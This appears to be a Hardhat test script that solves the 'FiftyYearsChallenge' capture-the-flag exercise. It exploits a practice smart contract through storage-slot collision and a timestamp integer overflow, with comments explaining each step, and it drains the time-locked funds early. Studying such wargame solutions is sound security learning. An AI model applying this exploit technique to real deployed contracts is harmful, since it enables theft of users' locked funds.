const { assert } = require("chai");
const { deployContract } = require("ethereum-waffle");
const { BigNumber } = require("ethers");
const { ethers, getNamedAccounts } = require("hardhat");

describe("12-FiftyYearsChallenge", function () {
    let targetContract, forceFundsContract, player;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("12");
        deployer = (await getNamedAccounts()).deployer;
        player = (await getNamedAccounts()).player;
        //connect with player
        targetContract = await ethers.getContract("FiftyYearsChallenge", player);
    });
    describe("upsert, ", async function () {
        it("get balance", async function () {
            const secondsInDays = 60 * 60 * 24;
            const index = BigNumber.from(1);
            const timestamp = BigNumber.from(2).pow(256).sub(secondsInDays);

            //contribution.amount = msg.value;            -> writes to slot 0, queue.length
            //contribution.unlockTimestamp = timestamp;   -> writes to slot 1, head
            //queue.push(contribution);                   -> first increase arr.length, push to array
            await targetContract.upsert("1", timestamp.toString(), {
                value: ethers.utils.parseUnits(`1`, `wei`),
            });
            // up until now we have:
            /**queue[0].amount == 10^18
             * queue[0].timestamp == 50years from now
             *
             * queue[1].amount == 2 (amount is 2 because .push increase the arr length and after that pushes to arr)
             * queue[1].timestamp == timestamp calculated above, (uint256.MAX - 1 days)
             */
            //a second upsert call is required to clear head(slot0/ by sending a 0 timestamp value)
            //this is possible because 0 >= queue[1].timestamp + 1 days
            //also, because we sending 1wei (msg.value is setting the queue.length), we overwrite queue[1]
            await targetContract.upsert("1", "0", { value: ethers.utils.parseUnits(`1`, `wei`) });
            /* queue[1].amount == 2 (now the amount variable coincide with the wei amount we sent in these 2 calls)
             * queue[1].timestamp == 0 */

            //withdraw first 2 indexes amounts
            await targetContract.withdraw("1");

            const isComplete = await targetContract.isComplete();
            assert.equal(isComplete, true);
        });
    });
});
